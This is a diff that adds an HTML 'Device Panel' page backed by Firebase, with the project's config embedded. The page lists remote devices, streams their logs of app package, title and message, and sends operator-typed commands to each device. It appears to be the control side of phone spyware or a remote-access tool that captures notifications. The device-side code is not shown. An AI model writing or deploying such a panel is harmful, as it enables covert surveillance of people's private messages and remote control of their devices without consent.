@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>📱 Device Panel</title>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+</head>
+<body>
+  <h1>🔍 Device Logs</h1>
+  <select id="deviceList"></select>
+  <textarea id="logBox" cols="100" rows="20" readonly></textarea>
+  <br>
+  <input id="commandBox" placeholder="Enter command...">
+  <button onclick="sendCommand()">Send Command</button>
+
+  <script>
+    const firebaseConfig = {
+  apiKey: "AIzaSyDDvMvgtiNPsfGtY80Wcw773J2FJsPxex4",
+  authDomain: "webapp12-c79dc.firebaseapp.com",
+  databaseURL: "https://webapp12-c79dc-default-rtdb.firebaseio.com",
+  projectId: "webapp12-c79dc",
+  storageBucket: "webapp12-c79dc.firebasestorage.app",
+  messagingSenderId: "156582262887",
+  appId: "1:156582262887:web:7974c76a6aeb1276c2fcc2",
+  measurementId: "G-2CQ8W85ZHY"
+};
+    firebase.initializeApp(firebaseConfig);
+
+    const db = firebase.database();
+    const deviceList = document.getElementById('deviceList');
+    const logBox = document.getElementById('logBox');
+
+    // Load devices
+    db.ref('devices').once('value').then(snapshot => {
+      snapshot.forEach(child => {
+        const id = child.key;
+        const opt = document.createElement('option');
+        opt.value = id;
+        opt.textContent = id;
+        deviceList.appendChild(opt);
+      });
+    });
+
+    deviceList.onchange = () => {
+      logBox.value = "";
+      const dev = deviceList.value;
+      db.ref(`devices/${dev}/logs`).on('child_added', snap => {
+        const log = snap.val();
+        logBox.value += `[${new Date(log.time).toLocaleString()}] ${log.pkg}: ${log.title} - ${log.msg}\n`;
+      });
+    };
+
+    function sendCommand() {
+      const dev = deviceList.value;
+      const cmd = document.getElementById('commandBox').value;
+      if (dev && cmd) {
+        db.ref(`devices/${dev}/command`).set(cmd);
+        alert(`✅ Sent '${cmd}' to ${dev}`);
+      }
+    }
+  </script>
+</body>
+</html>
